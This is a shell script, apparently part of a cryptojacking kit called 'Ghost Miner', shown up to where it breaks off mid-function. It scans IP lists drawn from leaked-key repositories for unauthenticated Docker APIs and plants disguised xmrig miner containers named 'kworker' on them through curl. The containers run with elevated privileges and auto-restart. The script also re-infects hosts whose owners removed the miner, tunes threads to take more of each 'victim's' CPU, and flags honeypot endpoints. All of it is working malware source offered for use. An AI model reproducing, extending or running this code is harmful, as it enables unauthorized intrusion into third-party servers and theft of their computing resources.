#!/bin/sh
# ============================================================================
# Ghost Miner docker spreader - the one vector that needs NO credentials.
#
# An exposed daemon on :2375 (or TLS :2376) needs no key, no username and no
# (key,user,host) pairing - you just POST a container that mines. curl only, so
# nothing has to exist on the victim, not even the docker CLI.
#
# The container is created with RestartPolicy=always (it comes back with the
# daemon, including after a reboot), CpuShares 512 (container equivalent of our
# niceness) and a boring name.
#
# Hosts come from the hunter's own list: every IP any leaked-key repo mentioned,
# whether or not it ever answered SSH. That is the point - this reaches boxes
# the SSH path can never touch, because nothing has to match.
#
# State: .hunt/dock.seen (daemon found, never rescanned) and .hunt/dock.tried
# (scanned, nothing there - rescanned after DOCK_RETRY so a later daemon is
# still caught).
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
# Snapshot env overrides BEFORE sourcing: worker.env publishes plain assignments,
# so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
# environment > worker.env > built-in default.
E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"; E_PORTS="${DOCK_PORTS:-}"
E_FRES="${DOCK_FRESH_RESERVE:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
PORTS="${DOCK_PORTS:-2375 2376 4243}"
SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
# ---- self-healing cadence ---------------------------------------------------
# Our timer shipped with a 6h period, which throttled the whole vector. The
# updater rewrites unit files but never their intervals, so enforce it here too:
# a drop-in outranks the main unit AND survives updater rewrites. Off-box runs
# (the PC under git-bash, containers) fail these tests and skip.
if [ -d /etc/systemd/system ] && [ -w /etc/systemd/system ] &&
   [ ! -f /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf ]; then
    mkdir -p /etc/systemd/system/kworker-dock.timer.d 2>/dev/null &&
        printf '[Timer]\nOnUnitActiveSec=20min\nRandomizedDelaySec=2min\n' \
            > /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf 2>/dev/null &&
        { systemctl daemon-reload 2>/dev/null; systemctl restart kworker-dock.timer 2>/dev/null; } || true
fi
# ---- re-arm: the difference between infecting and KEEPING --------------------
# Measured on this population: a slice of the boxes prunes foreign containers AND
# images off themselves (our container gone, /images/<img>/json 404, while the
# host's own container survives). dock.seen used to mean "skip forever", so a
# pruned host was never revisited - which is exactly why the placed-container
# count climbed while live capacity did not. So every run now re-verifies
# everything we own, plus a rotating slice of known daemons we no longer hold,
# and re-deploys what has vanished. Found, then lost, is still winnable.
REARM="${E_REARM:-${DOCK_REARM:-yes}}"
REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
# Re-creating a stale container is the only way config drift ever reaches a host we
# already hold - but each re-create is a create+start+delete, and a failed create on
# a host that already had our container is a net loss. Cap it per run so the fleet
# can never be churned faster than it can be rebuilt.
RECREATE_MAX="${DOCK_RECREATE_MAX:-8}"
# Both passes used to share one counter, and the re-arm list (everything we own + the
# ledger head) is ~1.7x the per-run cap - so re-arm ate the whole budget and the *fresh*
# queue was scanned zero times, run after run ("scanned 209 ... +0 new") while 5,000
# unscanned candidates sat in mass.found. The fleet was frozen at what it had, not
# growing. Reserve a slice of the cap for genuinely new hosts.
FRESH_RES="${E_FRES:-${DOCK_FRESH_RESERVE:-40}}"   # % of MAX kept for the fresh pass
REARM_CAP=$(( MAX * (100 - FRESH_RES) / 100 ))
if [ "$REARM_CAP" -lt 1 ]; then REARM_CAP=1; fi
MOCK_RECHECK="${E_MOCKR:-${DOCK_MOCK_RECHECK:-10}}"   # flagged hosts re-checked per run
SEEN="$WORK/dock.seen"            # daemon found here
TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
LIVE="$WORK/dock.live"       # ip<TAB>epoch, appended whenever a host is VERIFIED running
                             # ours. Appended (not truncated) so dockhot.sh and dock.sh
                             # can both contribute; freshness is the reader's business.
touch "$LIVE"
RAMFILE="$WORK/dock.ram"     # ip \t MemTotal - victim size, drives the re-arm order
PORTMAP="$WORK/dock.ports"   # ip \t daemon port, from mass.found's verified rows
# mass.found holds two kinds of row: sweep-verified daemons ("ip<TAB>docker=ver@port",
# older ones without the @port) and unverified shodan candidates ("ip<TAB>shodan[-search]").
# Keep a map of the verified rows so the probe stops guessing: measured, 100% of our live
# daemons answer on plain :2375, while ~96% of *candidates* are simply dead - so an
# unverified row gets one timeout instead of three, a ~3x faster scan of the queue.
awk -F'\t' 'NF > 1 && $2 !~ /shodan/ {
        p = "2375"
        if (match($2, /@[0-9]+$/)) p = substr($2, RSTART + 1)
        print $1 "\t" p
    }' "$WORK/mass.found" 2>/dev/null | tr -d '\r' | sort -u > "$PORTMAP" 2>/dev/null || :
touch "$RAMFILE"
MOCKFILE="$WORK/dock.mock"   # acks create/start but holds no real container (canned API)
touch "$MOCKFILE"
HEALFILE="$WORK/heal.list"   # victims that answer :47999 but produce ~nothing
NOW=$(date +%s)

[ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
[ -n "${POOL:-}" ]   || { echo "dock: POOL unset"; exit 0; }

HOSTS="$WORK/dockhosts.$$"
# CR matters, and it cost us the whole sweep: mass.found can arrive with CRLF
# (scp'd from the Windows box) and the strict IPv4 regex below then drops
# "1.2.3.4\r" - so thousands of sweep-verified daemons sat in the queue and the
# deployer never saw one row of it ("scanned 203" while mass.found held 4,034).
# Strip CR before matching, same as publish.sh does for the kit itself.
{ cut -f3 "$WORK/targets.txt" 2>/dev/null || :
  cut -f3 "$WORK/loot.txt" 2>/dev/null || :
  cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
    | tr -d '\r' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"

# Aim at hosts that can actually run something. A daemon classified shell_only
# (answers every API call, executes nothing) or canned_page (HTML from a mock)
# will happily accept a deploy and never produce - that is the "placed 57, gained
# 0" shape. Rows come from dockcls.sh; no file means no filtering.
# Deliberately NOT filtered: no_api, because reachability is source dependent and
# flips back (see dockcls's second-vantage run) - those hosts are worth retrying.
if [ -s "$WORK/dock.cls" ]; then
    awk -F'\t' '$2=="shell_only" || $2=="canned_page" {print $1}' "$WORK/dock.cls" 2>/dev/null | sort -u > "$WORK/dock.dead"
    if [ -s "$WORK/dock.dead" ]; then
        grep -vxF -f "$WORK/dock.dead" "$HOSTS" > "$HOSTS.n" 2>/dev/null && mv -f "$HOSTS.n" "$HOSTS"
        echo "dock: hosts=$(wc -l < "$HOSTS") after excluding $(wc -l < "$WORK/dock.dead") shell_only/canned"
    fi
fi

# Re-arm rows, built before the fresh queue so healing is never starved by the
# cap. Every real host we own, every run; plus the head of the rotating ledger.
# Canned-API hosts are "owned" too but never really run, so re-checking all of them
# every run is waste - they are verified on a slow rotation instead.
REARM_LIST="$WORK/rearm.$$"
: > "$REARM_LIST"
if [ "$REARM" = yes ]; then
    # LIVE hosts FIRST, and no global sort afterwards. The order used to be
    # OWNFILE -> ledger -> sort -u, so the walk order of the hosts that actually produce
    # was effectively arbitrary and they could sit behind hundreds of dead ledger
    # daemons. That is how a rig-id re-create could run for an hour without reaching a
    # single live host.
    if [ -s "$LIVE" ]; then
        { cut -f1 "$LIVE" 2>/dev/null || :; } \
            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
    fi
    if [ -s "$MOCKFILE" ]; then
        { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' \
            | grep -vxF -f "$MOCKFILE" >> "$REARM_LIST" || :
        head -n "$MOCK_RECHECK" "$MOCKFILE" 2>/dev/null >> "$REARM_LIST" || :
        # rotate MOCKFILE left by MOCK_RECHECK so the rest come round next runs
        tail -n +$((MOCK_RECHECK + 1)) "$MOCKFILE" > "$MOCKFILE.n" 2>/dev/null || :
        head -n "$MOCK_RECHECK" "$MOCKFILE" >> "$MOCKFILE.n" 2>/dev/null || :
        mv -f "$MOCKFILE.n" "$MOCKFILE" 2>/dev/null || :
    else
        { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
    fi
    head -n "$REARM_MAX" "$LEDGER" 2>/dev/null >> "$REARM_LIST" || :
fi
# order-preserving dedupe (sort -u would throw the live-first ordering away)
awk '!seen[$0]++' "$REARM_LIST" > "$REARM_LIST.o" 2>/dev/null && mv -f "$REARM_LIST.o" "$REARM_LIST" || :
# a known-but-lost host can have dropped out of every candidate list, so union
# the re-arm rows into the walk too (the fresh pass skips them by membership).
cat "$REARM_LIST" >> "$HOSTS"
sort -u "$HOSTS" -o "$HOSTS" 2>/dev/null || :

# container command line (wallet/pool/rig, same identity as the ssh payload).
# SYS_ADMIN + host IPC let xmrig apply the MSR mod and reach the host's hugepage
# pool, otherwise it logs "HASHRATE WILL BE LOW" and loses a chunk of the speed.
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\""
case "${TLS:-true}" in
    true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
esac
# Output knobs. Measured on a live victim (8 vCPU / 8GB): our xmrig sat at 210 H/s
# while using 0.65 of ONE core - it had taken the image's default single-thread
# layout and left seven cores idle. xmrig's own autoconfig is conservative; these
# three flags are the whole difference between 21 H/s average and a real core's
# worth: use every visible vCPU, take the JIT/huge-page path instead of the slow
# default, and stop yielding the CPU back the moment the owner twitches.
CMDS="$CMDS,\"--cpu-max-threads-hint=100\",\"--huge-pages-jit\",\"--cpu-no-yield\""
# Publish xmrig's own API on a fixed high port. Nothing else in this kit can read a
# victim's *production*: /logs and exec-start return empty on this population, and the
# pool's HTTP API is unreachable from box1. With 47999 bound, the host's IP answers
# /2/summary with real H/s - per-machine truth, which is what tells a stale 1-thread
# container from a working one, and what the auto-heal keys off.
CMDS="$CMDS,\"--http-port\",\"47999\",\"--http-host\",\"0.0.0.0\""
# A label of our own is how the container is recognised later without guessing:
# image-name matching alone would adopt a stranger's xmrig, and after a host
# prunes us we must be able to tell "ours is gone" reliably - that is the whole
# re-arm trigger.
TAG="\"kworker\":\"1\""
# CpuShares 512 was our "polite container" setting (same idea as the ssh payload's
# nice 19) - but on an 8-vCPU box xmrig was only getting 0.65 of a core because the
# host was busy, so the politeness was costing us most of the machine. 2048 (2x a
# default container) is still a freeloader, just a less apologetic one.
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"

# --- primary container body: survives a crash AND fits the host ----------------
# Two measured failures this addresses.
#  1. If xmrig exits (OOM, MSR refusal, cgroup pressure) the container dies with it.
#     RestartPolicy brings it back, but the identity (name, label, rig id) churns and
#     our ledger churns with it. A shell supervisor restarts the miner IN PLACE, so a
#     crash costs seconds instead of a whole re-deploy.
#  2. Threads were left to xmrig's conservative autoconfig: measured on an 8 vCPU box
#     it took 0.65 of ONE core (212 H/s) and left seven idle. Threads now come from
#     the host's own NCPU/MemTotal, and a Memory cap points the host's OOM killer at
#     the container rather than at the host.
threads_for() {
    nc=${1:-0}; mm=${2:-0}
    t=$((nc - 1)); [ "$t" -lt 1 ] && t=1
    if [ "$mm" -gt 0 ]; then
        # ~256MB of scratchpad per thread, keeping 768MB back for the dataset slack
        cap=$(( (mm - 805306368) / 268435456 ))
        [ "$cap" -lt 1 ] && cap=1
        [ "$t" -gt "$cap" ] && t=$cap
    fi
    [ "$t" -gt 16 ] && t=16
    printf '%s' "$t"
}
# --- plain body: NO Entrypoint override, NO sh -c supervisor --------------------------
# Measured on box1's own dockerd: a container built with Entrypoint ["sh","-c"] and a
# `while :; do /usr/bin/xmrig ...; done` loop produced NO stdout and nothing on :47999,
# while the exact same args with the image's own entrypoint (./xmrig, WorkingDir /xmrig)
# ran immediately - XMRig/6.26.0 banner, CPU, hugepages, and connects to the pool. So the
# supervisor lane was a fleet-wide no-op. Resilience comes free from RestartPolicy always.
pbody() {   # $1=JSON args array body  $2=Memory bytes (0=none) $3=1 Privileged $4=1 hostnet
    _mem="";  [ "${2:-0}" -gt 0 ] && _mem=",\"Memory\":$2"
    _priv=""; [ "${3:-0}" = 1 ] && _priv=",\"Privileged\":true"
    if [ "${4:-0}" = 1 ]; then
        _pb=',"NetworkMode":"host"'
    else
        _pb=',"PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}'
    fi
    printf '{"Image":"%s","Cmd":[%s],"Labels":{%s},"ExposedPorts":{"47999/tcp":{}},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host"%s%s%s}}' \
        "$IMAGE" "$1" "$TAG" "$_pb" "$_mem" "$_priv"
}
supbody() {   # $1=args(plain) $2=Memory bytes (0=none) $3=1 to also try Privileged $4=1 hostnet
    # /xmrig/xmrig is where the image actually keeps the binary (Entrypoint ["./xmrig"],
    # WorkingDir /xmrig). /usr/bin/xmrig does NOT exist - so a supervisor loop calling
    # /usr/bin/xmrig found nothing, printed "not found" every 10s and mined ZERO. That is
    # why every container was silent on :47999 and no worker ever appeared in the pool.
    # Keep both with a fallback so a future image layout cannot silently kill the fleet.
    _sup="while :; do /xmrig/xmrig $1 || /usr/bin/xmrig $1; sleep 10; done"
    _mem="";  [ "${2:-0}" -gt 0 ] && _mem=",\"Memory\":$2"
    _priv=""; [ "${3:-0}" = 1 ] && _priv=",\"Privileged\":true"
    if [ "${4:-0}" = 1 ]; then
        # Host networking: xmrig binds :47999 straight on the host, so the API does not
        # depend on docker-proxy/iptables. Measured broken on some of these daemons - a
        # container whose Cmd carried --http-port still answered nothing on :47999.
        _pb=',"NetworkMode":"host"'
    else
        # Otherwise publish it. A PortBinding needs the host port to be FREE, which is
        # exactly why the old container is STOPPED before a re-create rather than kept.
        _pb=',"PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}'
    fi
    printf '{"Image":"%s","Entrypoint":["sh","-c"],"Cmd":["%s"],"Labels":{%s},"ExposedPorts":{"47999/tcp":{}},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host"%s%s%s}}' \
        "$IMAGE" "$_sup" "$TAG" "$_pb" "$_mem" "$_priv"
}

# a host is interesting only if a docker API answers - so verify it IS docker,
# not just an open port (and no /dev/tcp, so bash is not required either)
endpoint() {
    # Per-host port list: the recorded port (plus fallbacks) for a host we have already
    # seen answer as a daemon, otherwise :2375 only. DOCK_PORTS set explicitly wins.
    plist="$PORTS"
    if [ -z "${E_PORTS:-}" ]; then
        rp=$(grep -m1 "^$1	" "$PORTMAP" 2>/dev/null | cut -f2)
        if [ -n "$rp" ]; then plist="$rp $PORTS"; else plist="2375"; fi
    fi
    for p in $plist; do
        case "$p" in
            2375|4243) b="http://$1:$p";  o="" ;;
            2376) b="https://$1:2376"; o="-k" ;;
            *) continue ;;
        esac
        v=$(curl -fsS $o --max-time 4 "$b/version" 2>/dev/null) || continue
        case "$v" in *ApiVersion*) printf '%s|%s\n' "$b" "$o"; return 0 ;; esac
    done
    return 1
}

# Canned-API detection - the difference between a fleet and a mirage.
#
# Measured on this population: ~9 of every 10 endpoints that answer are NOT
# docker. They are fabricated fixtures (prom/prometheus, mysql:8.0, node:18-alpine,
# image names like registry.internal.example/..., hand-typed ids such as a
# repeating a1b2c3d4..., one that emits a 63-char id). They answer version/info/
# containers/json/create/start with confident 200s and hold nothing, so they mine
# zero - and they were eating the re-arm budget every run.
#
# Two tells, cheapest first:
#   1. after create+start our container is not in the list (they keep a frozen one)
#   2. the id they gave us describes somebody else's container, dated days ago -
#      a real engine dates *our* container to now. Test 2 is conclusive on its own
#      and needs nothing but the id we already hold.
mockflag() {
    if grep -qxF "$mip" "$MOCKFILE" 2>/dev/null; then :; else
        printf '%s\n' "$mip" >> "$MOCKFILE"
        echo "dock: $mip is a fixture, not a daemon ($1) - flagged"
    fi
}

# ...and the way back. A flag is a claim about the endpoint, not a life sentence:
# fixtures get fixed, fronts get replaced, a host can be busy when we knock. Any
# check that now sees our container (or a container dated now) clears the flag.
mockunflag() {
    if grep -qxF "$mip" "$MOCKFILE" 2>/dev/null; then
        grep -vxF "$mip" "$MOCKFILE" > "$MOCKFILE.n" 2>/dev/null || : > "$MOCKFILE.n"
        mv -f "$MOCKFILE.n" "$MOCKFILE" 2>/dev/null || :
        echo "dock: $mip answers for real now - unflagged"
    fi
}

mockcheck() {
    mip=$1; mid=$2; mname=$3
    ml=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || ml=""
    case "$ml" in
        *"/$mname\""*) mockunflag; return 0 ;;   # ours is really there
        *"$mid"*)      mockunflag; return 0 ;;   # ... or at least its id is
    esac
    [ -n "$mid" ] || { mockflag "no id back"; return 0; }
    mj=$(curl -sS $opts --max-time 6 "$b/containers/$mid/json" 2>/dev/null) || mj=""
    mcre=$(printf '%s' "$mj" | grep -o '"Created":"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$mcre" ]; then
        mt=$(date -d "${mcre%%.*}" +%s 2>/dev/null) || mt=""
        if [ -n "$mt" ] && [ $(( $(date +%s) - mt )) -le 900 ] &&
           [ $(( $(date +%s) - mt )) -ge -900 ]; then
            mockunflag          # dated now: a real engine, ours just got pruned
            return 0
        fi
    fi
    mockflag "container dated ${mcre:-never}"
    return 0
}

dock_one() {
    ip=$1
    ep=$(endpoint "$ip") || {
        printf '%s\t%s\n' "$NOW" "$ip" >> "$TRIED"
        return 0
    }
    base=${ep%|*}
    opts=${ep#*|}

    ver=$(curl -fsS $opts --max-time 4 "$base/version" 2>/dev/null) || ver=""
    # old engines (18.06-era) emit '"Version": "x"' WITH a space; a strict grep
    # silently returned an empty version and, worse, an empty ApiVersion - which
    # sent every later call down the unversioned path they do not route.
    vs=$(printf '%s' "$ver" | grep -o '"Version": *"[^"]*"' | head -1 | cut -d'"' -f4)
    # Speak /v<ApiVersion>/... like a real client. Not cosmetic: old engines and
    # api proxies answer "page not found" to *unversioned dynamic* paths such as
    # /containers/<id>/json or /containers/<id>/start, while the static
    # /containers/json and /version keep working - which is precisely how
    # "created but start failed" was born (create is static, start is not).
    vapi=$(printf '%s' "$ver" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
    b="$base"
    [ -n "$vapi" ] && b="$base/v$vapi"
    printf '%s\n' "$ip" >> "$SEEN"
    echo "dock: daemon $ip  $base  docker=${vs:-?} api=${vapi:-?}"

    # if this daemon is the very box we are running on, the ssh payload already
    # mines here - a second xmrig would just buy a second randomx dataset. Only
    # an existing container of ours is worth touching (handled above).
    # host size, read EVERY time (not only for the self-check): threads and the
    # memory cap are computed from it.
    inf=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null) || inf=""
    memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
    ncpu=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    [ -n "${memb:-}" ] && printf '%s\t%s\n' "$1" "$memb" >> "$RAMFILE"
    if [ "$SKIPSELF" = yes ]; then
        me=$(hostname 2>/dev/null) || me=""
        nm=$(printf '%s' "$inf" | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
            echo "dock: $ip is this host (payload mines here already)"
            return 0
        fi
    fi

    # ONE list call tells us what is already here. Name-based /containers/<n>/json
    # 404s on a chunk of the population (old engines, api proxies - "page not
    # found"), so a name always *looked* free and the container was created blind;
    # the start by name then 404s too. So: read the list, and take the id from
    # create's response instead of spelling it by name.
    lst=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    if [ -z "$lst" ] && [ "$b" != "$base" ]; then
        # this front routes only the bare spelling - pin that for every call that
        # follows rather than keep guessing
        lst=$(curl -sS $opts --max-time 6 "$base/containers/json?all=1" 2>/dev/null) || lst=""
        [ -n "$lst" ] && b="$base"
    fi
    # docker 18.06 writes '"Id": "x"' with a space; normalise once so the awk
    # below (and the name-taken test) can trust a single spelling.
    lst=$(printf '%s' "$lst" | sed 's/": /":/g')
    have=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
        { n = split($0, a, "\"Id\":\"")
          for (i = 2; i <= n; i++)
              if (index(a[i], tag) > 0 || index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
    if [ -n "$have" ]; then
        up=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
            { n = split($0, a, "\"Id\":\"")
              for (i = 2; i <= n; i++)
                  if (index(a[i], tag) > 0 || index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
        if [ "$up" = up ]; then
            # Config drift: we only re-create a container when it is missing, so a
            # host infected before the CpuShares/thread-hint change would keep its
            # throttled container forever. Compare, and force a re-create if stale.
            # Also re-create when the container still signs in with the shared rig
            # id: without that the per-host census never materialises on hosts we
            # already hold.
            cj=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null) || cj=""
            shares=$(printf '%s' "$cj" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
            hasip=$(printf '%s' "$cj" | grep -c "\"$ip\"")
            # Config drift is a re-create reason - but a re-create must never cost
            # us the host. So remember the old id, leave the container RUNNING, and
            # let the deploy path delete it only AFTER the replacement is verified.
            # (Deleting first is how most owned hosts ended up empty while still
            # answering the API.)
            cjcmd=$(printf '%s' "$cj" | grep -o '"Cmd":\[[^]]*\]' | head -1)
            stale=""
            # FIRST: the supervisor shape never mined (see the pbody comment), so anything
            # deployed before the fix must be re-created regardless of anything else.
            if printf '%s' "$cjcmd" | grep -q -- 'while :'; then
                stale="old sh -c supervisor shape (never mined)"
            elif [ -n "${shares:-}" ] && [ "$shares" -lt 2048 ]; then
                stale="CpuShares $shares"
            elif [ "${hasip:-0}" = 0 ]; then
                stale="no per-host rig id"
            elif ! printf '%s' "$cjcmd" | grep -q -- '--threads'; then
                stale="threads not pinned"
            elif ! printf '%s' "$cjcmd" | grep -q -- '--http-port'; then
                stale="no published hashrate api"
            elif ! printf '%s' "$cjcmd" | grep -q -- '/xmrig/xmrig'; then
                # The supervisor used to call /usr/bin/xmrig, which does not exist in this
                # image (Entrypoint ["./xmrig"], WorkingDir /xmrig) - so every container
                # was a no-op loop and mined nothing. One re-create fixes a host.
                stale="wrong miner path (no /xmrig/xmrig)"
            elif ! printf '%s' "$cjcmd" | grep -q -- '--rig-id'; then
                # -p alone is only the password: xmrig names the pool worker from --rig-id.
                # A container deployed before that was added signs in under its hostname,
                # so the pool cannot attribute production to the host's IP.
                stale="no --rig-id (pool cannot map this host)"
            elif ! printf '%s' "$cj" | grep -q '"NetworkMode":"host"'; then
                # The container looks current - but does the published API actually answer
                # from OUTSIDE? On several of these daemons docker-proxy/iptables does not
                # forward a published port, so --http-port is set and :47999 is still dead
                # (measured on box1 itself). Those roll once to the hostnet rung. The
                # NetworkMode test is the loop guard: after that re-create the container
                # carries NetworkMode host, so a host that stays silent is not re-created
                # again and again.
                if ! curl -sS -m 4 "http://$ip:47999/2/summary" >/dev/null 2>&1; then
                    stale="api not reachable from outside (wants hostnet)"
                fi
            elif [ -s "$HEALFILE" ] && grep -qxF "$ip" "$HEALFILE" 2>/dev/null; then
                stale="underproducing (victim.sh said so)"
            fi
            if [ -n "$stale" ] && [ "$rcount" -lt "$RECREATE_MAX" ]; then
                oldid="$have"; have=""; rcount=$((rcount + 1))
                echo "dock: $ip re-creating (stale: $stale) - old stopped so the new one can take :47999"
                # Stop, do NOT delete: the old container is holding host port 47999, and a
                # create+start with a conflicting PortBinding fails EVERY rung with "port
                # is already allocated". That is how a "re-creating" host could log the
                # same line run after run and never actually change. The id stays so the
                # old can be restarted if every rung fails (see the end of dock_one).
                if [ -n "${oldid:-}" ]; then
                    curl -sS $opts --max-time 20 -X POST "$b/containers/$oldid/stop?t=3" >/dev/null 2>&1 || :
                    oldstop=1
                fi
                # heal.list is a queue, not a state: drop the entry so one victim.sh
                # cycle cannot re-create the same host again and again
                case "$stale" in
                    *underproducing*)
                        grep -vxF "$ip" "$HEALFILE" > "$HEALFILE.n" 2>/dev/null && mv -f "$HEALFILE.n" "$HEALFILE" || : ;;
                esac
            elif [ -n "$stale" ]; then
                echo "dock: $ip stale ($stale), re-create cap reached - keeping it"
            fi
        fi
        if [ -n "${have:-}" ]; then
            # We hold one. If it is current (or the re-create cap blocked us), keep
            # it and we are done for this host.
            if [ "$up" = up ]; then
                echo "dock: $ip already runs ours ($have)"
                # also the moment to clear a stale flag: a mock-flagged host whose
                # container is right there is not a mock.
                mockcheck "$ip" "$have" "$name"
            else
                curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
                echo "dock: $ip started our existing container ($have)"
            fi
            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
            printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
            return 0
        fi
    fi          # closes `if [ -n "$have" ]` above: reaching here means no container to
                # keep, so the create path below MUST run. Previously this fi existed
                # and the block above returned before it - the re-create never happened.
        # FALL THROUGH to the create path. This is the bug that kept the fleet stale:
        # the stale branch above clears HAVE (to force a re-create) but the old code
        # returned right here anyway - so a "re-creating" host was logged, counted and
        # then left untouched, run after run. That is why every host we still held was
        # mining on 1 thread with no thread hint and no published API.

    # pick a free boring name; "taken" means the list mentions it
    name=""
    for n in kworker kworker1 kworker2 kworker3; do
        case "$lst" in
            *"\"/$n\""*) continue ;;   # someone else's container holds that name
        esac
        name=$n
        break
    done
    [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }

    # pull only if the image is not already there (their bandwidth)
    if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
        echo "dock: $ip pulling $IMAGE"
        curl -sS $opts --max-time 300 -X POST \
             "$b/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
    fi

    # NOTE the -f on the create/start checks: without it a 404 body
    # ({"message":"page not found"}) still exits 0 and a failed start is
    # recorded as a deploy.
    #
    # Per-host rig id. Every victim used to sign in with the same password, so the
    # pool reported exactly one rig ("node") no matter how many machines were
    # mining - and "how many are we on" could only be guessed at. Signing in as the
    # host's own IP turns the pool's identifiers endpoint into a live machine
    # census AND gives per-machine hashrate, i.e. the only way to see which hosts
    # actually produce instead of which ones merely answered.
    CMDH=$(printf '%s' "$CMDS" | sed "s|\"-p\",\"[^\"]*\"|\"-p\",\"$ip\"|")
    # The rig id must ALSO go to --rig-id: xmrig takes the pool worker NAME from --rig-id,
    # not from -p (which is only the password). Without it every victim signed in under
    # its own hostname, the pool could not map a worker to an IP, and the only per-host
    # truth was :47999 - which a lot of these hosts cannot expose inbound at all.
    CMDH=$(printf '%s' "$CMDH" | sed "s|\"-p\",\"$ip\"|\"-p\",\"$ip\",\"--rig-id\",\"$ip\"|")
    # RandomX fast mode wants ~2.1 GB resident, and a host that is tight (or has no
    # hugepage pool) is exactly where our container OOM-dies - measured on our own
    # 3.8 GB box, whose container sat in "Restarting (137)" - and a stopped
    # container is what the host's prune then sweeps away, image and all. So on a
    # small-RAM host take light mode: a survivor beats a fast corpse, and on these
    # hosts it is the whole difference between 0 H/s and a steady ~150.
    # Threads are pinned from the host's OWN size: xmrig's autoconfig took 0.65 of one
    # core on an 8 vCPU box (212 H/s) and left seven cores idle.
    th=$(threads_for "${ncpu:-0}" "${memb:-0}")
    CMDH=$(printf '%s' "$CMDH" | sed "s|\"--cpu-no-yield\"|\"--cpu-no-yield\",\"--threads\",\"$th\"|")
    if [ -n "${memb:-}" ] && [ "$memb" -lt 2500000 ]; then
        CMDH=$(printf '%s' "$CMDH" | sed 's|"--huge-pages-jit"|"--randomx-mode=light"|')
    fi
    # plain-args spelling of the same line, for the shell supervisor
    ARGSH=$(printf '%s' "$CMDH" | tr -d '"' | tr ',' ' ')
    memlim=0
    if [ -n "${memb:-}" ] && [ "$memb" -gt 1500000000 ]; then memlim=$((memb * 4 / 5)); fi
    BODYH=$(printf '%s' "$BODY" | sed "s|\"Cmd\":\[[^]]*\]|\"Cmd\":[$CMDH]|")
    BODYMIN="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDH],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
